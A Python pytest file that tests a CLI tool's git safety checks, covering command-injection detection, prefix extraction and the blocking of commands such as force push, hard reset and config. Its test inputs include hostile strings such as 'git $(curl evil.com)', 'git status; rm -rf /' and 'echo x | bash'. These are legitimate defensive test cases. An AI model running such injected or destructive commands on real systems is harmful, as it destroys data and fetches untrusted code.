"""Tests for novacode_cli.git_safety — git command validation and safety checks."""

import pytest

from novacode_cli.git_safety import (
    DANGEROUS_GIT_COMMANDS,
    BLOCKED_COMMANDS,
    COMMAND_INJECTION_PATTERNS,
    detect_command_injection,
    extract_command_prefix,
    is_dangerous_command,
    is_safe_git_command,
)


class TestDetectCommandInjection:
    """Tests for detect_command_injection()."""

    def test_detects_backtick_subshell(self):
        assert detect_command_injection("git status`ls`") is True

    def test_detects_dollar_subshell(self):
        assert detect_command_injection("git $(curl evil.com)") is True

    def test_detects_pipe_to_bash(self):
        assert detect_command_injection("echo x | bash") is True

    def test_detects_semicolon_command_chain(self):
        assert detect_command_injection("git status; rm -rf /") is True

    def test_detects_double_ampersand(self):
        assert detect_command_injection("git status && rm -rf /") is True

    def test_detects_double_pipe(self):
        assert detect_command_injection("false || rm -rf /") is True

    def test_allows_normal_git_command(self):
        assert detect_command_injection("git status") is False

    def test_allows_normal_git_commit(self):
        assert detect_command_injection("git commit -m 'hello world'") is False

    def test_handles_empty_string(self):
        assert detect_command_injection("") is False

    def test_handles_whitespace_string(self):
        assert detect_command_injection("   ") is False


class TestExtractCommandPrefix:
    """Tests for extract_command_prefix()."""

    def test_empty_string_returns_none(self):
        """extract_command_prefix("") should return "none", not raise IndexError."""
        result = extract_command_prefix("")
        assert result == "none"

    def test_simple_git_status(self):
        assert extract_command_prefix("git status") == "git status"

    def test_git_commit_with_flags(self):
        assert extract_command_prefix("git commit -m 'msg'") == "git commit"

    def test_git_push_with_args(self):
        assert extract_command_prefix("git push origin main") == "git push"

    def test_git_log_with_options(self):
        assert extract_command_prefix("git log -n 5") == "git log"

    def test_non_git_command_returns_none(self):
        assert extract_command_prefix("ls -la") == "none"

    def test_command_injection_detected(self):
        assert extract_command_prefix("git status`ls`") == "command_injection_detected"

    def test_with_env_var_prefix(self):
        result = extract_command_prefix("GIT_CONFIG=test git status")
        assert result == "git status", f"Expected 'git status', got '{result}'"

    def test_whitespace_padded_command(self):
        assert extract_command_prefix("  git status") == "git status"

    def test_single_word_git(self):
        result = extract_command_prefix("git")
        assert result in ("git", "none")


class TestIsDangerousCommand:
    """Tests for is_dangerous_command()."""

    def test_push_force_is_dangerous(self):
        dangerous, reason = is_dangerous_command("git push --force")
        assert dangerous is True
        assert "push --force" in reason.lower() or "Force push" in reason

    def test_reset_hard_is_dangerous(self):
        dangerous, reason = is_dangerous_command("git reset --hard HEAD~")
        assert dangerous is True

    def test_git_status_is_safe(self):
        dangerous, reason = is_dangerous_command("git status")
        assert dangerous is False
        assert reason == ""

    def test_commit_amend_is_blocked(self):
        dangerous, reason = is_dangerous_command("git commit --amend")
        assert dangerous is True
        assert "Blocked" in reason

    def test_handles_empty_string(self):
        dangerous, reason = is_dangerous_command("")
        assert dangerous is False

    def test_dangerous_is_substring_safe(self):
        """Verify 'clean -fd' is detected but 'cleanup' isn't."""
        dangerous, reason = is_dangerous_command("clean -fd")
        assert dangerous is True

    def test_git_config_is_blocked(self):
        dangerous, reason = is_dangerous_command("git config user.name test")
        assert dangerous is True


class TestIsSafeGitCommand:
    """Tests for is_safe_git_command()."""

    def test_safe_git_status(self):
        safe, msg = is_safe_git_command("git status")
        assert safe is True

    def test_dangerous_push_force(self):
        safe, msg = is_safe_git_command("git push --force")
        assert safe is False
        assert "Dangerous" in msg

    def test_injection_detected(self):
        safe, msg = is_safe_git_command("git status`ls`")
        assert safe is False
        assert "injection" in msg

    def test_handles_empty_string(self):
        safe, msg = is_safe_git_command("")
        assert safe is True

    def test_non_git_command(self):
        safe, msg = is_safe_git_command("echo hello")
        assert safe is True